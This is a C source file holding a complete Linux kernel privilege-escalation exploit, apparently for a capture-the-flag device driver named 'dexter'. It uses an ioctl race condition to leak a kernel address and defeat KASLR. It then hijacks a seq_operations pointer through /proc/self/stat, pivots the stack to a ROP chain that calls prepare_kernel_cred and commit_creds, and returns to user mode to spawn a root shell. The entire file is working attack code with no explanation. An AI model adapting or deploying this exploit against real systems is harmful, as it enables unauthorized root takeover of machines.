#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}

#define pause() getchar()
#define DEVICE_NAME "dexter"
#define BUFFER_SIZE 0x20
#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002
typedef struct {
  char *ptr;
  size_t len;
} request_t;
int global_fd;
void open_dev(){
    global_fd = open("/dev/"DEVICE_NAME,O_RDWR);
    if(global_fd < 0)
        errExit("open dev");
}
int shmid;
int shmid_open()
{
	if ((shmid=shmget(IPC_PRIVATE,100,0600))==-1)
	{
		puts("[X] Shmget Error");
		exit(0);
	}
	char *shmaddr=shmat(shmid,NULL,0);
	if (shmaddr==(void*)-1)
	{
		puts("[X] Shmat Error");
		exit(0);
	}
	return shmid;
}
char buf[BUFFER_SIZE+0x20];
char buf_rep[BUFFER_SIZE+0x20];
request_t req = {
    .ptr = buf,
    .len = BUFFER_SIZE
};
request_t req_rep = {
    .ptr = buf_rep,
    .len = BUFFER_SIZE
};
int dev_set(void *arg){
    return ioctl(global_fd,CMD_SET,arg);
}
int dev_get(void *arg){
    return ioctl(global_fd,CMD_GET,arg);
}
_Bool win;
void* oob(void *){
    while(!win){
        // log_info(":D");
        req.len = sizeof(buf);
        if(memcmp(buf,buf_rep,sizeof(buf))){
            log_info("win");
            win=1;
        }
    }
}
void* race_leak(void *){
    while(!win){
        // log_info(":X");
        req.len = BUFFER_SIZE;
        dev_get(&req);
        if(memcmp(buf,buf_rep,sizeof(buf))){
            log_info("win");
            win=1;
        }
    }    
}
size_t count = 0;
void* overflow(void *){
    while(!win){
        // log_info(":)");
        req.len = sizeof(buf);
        if(count > 0x500)
            win=1;
    }
}
void* race_write(void *){
    while(!win){
        // log_info("%zu",count++);
        
        req.len = BUFFER_SIZE;
        dev_set(&req);
        usleep(1);
        count++;
    }       
}
// int seq_spray[50];
int64_t _text;
int main(int argc,char** argv,char **envp){
    save_state();
    open_dev();
    int seq_fd = open("/proc/self/stat",O_RDONLY);
    dev_set(&req_rep);
    dev_get(&req);
    pthread_t th1,th2,th3,th4;
    pthread_create(&th1,NULL,oob,NULL);
    pthread_create(&th2,NULL,race_leak,NULL);
    pthread_join(th1,NULL);
    pthread_join(th2,NULL);
    memcpy(buf_rep,buf,sizeof(buf));
    _text = ((int64_t *)(buf))[4]-0x170f80;
    log_info("_text = 0x%lx",_text);
    win = 0;
    ((int64_t *)(buf))[4] = _text+0x354e67; // mov esp, 0x89480002 ; ret
    void * m = mmap((void *)0x89480000-0x1000,PAGE*2,PROT_EXEC | PROT_WRITE | PROT_READ, MAP_FIXED |MAP_ANONYMOUS | MAP_PRIVATE,0,0);
    if(m==NULL)
        errExit("mmap");
    *(char *)m=0;
    int64_t* rop = (void *)0x89480002;
    u_int64_t off = 0;
    rop[off++] = _text+0x9b0cd; // pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = _text+0x729b0;// prepare_kernel_cred
    rop[off++] = _text+0x2e90ac; // pop rdx ; pop rcx ; pop r12 ; pop rbp ; ret
    rop[off++] =  0; // rdx
    rop[off++] = -1; // rcx
    rop[off++] =  0; // r12
    rop[off++] =  0; // rbp
    rop[off++] = _text+0x29a032; // add rdx, rax ; jmp 0xffffffff8129a040 -> cmp cl, byte ptr [rax] ; je 0xffffffff8129a037 ; ret
    rop[off++] = _text+0x9b0cd; // pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = _text+0x2c6f4; // or rdi, rax ; cmp rdx, rdi ; jne 0xffffffff8102c6fd ; ret
    rop[off++] = _text+0x72810; // commit_creds
    rop[off++] = _text+0x800e10+22; // swapgs_restore_regs_and_return_to_usermode+22
    rop[off++] = 0 ; //rax
    rop[off++] = 0 ; //rdi
    rop[off++] = user_ip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;
    pthread_create(&th3,NULL,overflow,NULL);
    pthread_create(&th4,NULL,race_write,NULL);
    pthread_join(th3,NULL);
    pthread_join(th4,NULL);
    log_info("DONE!");
    read(seq_fd,buf,1);
};
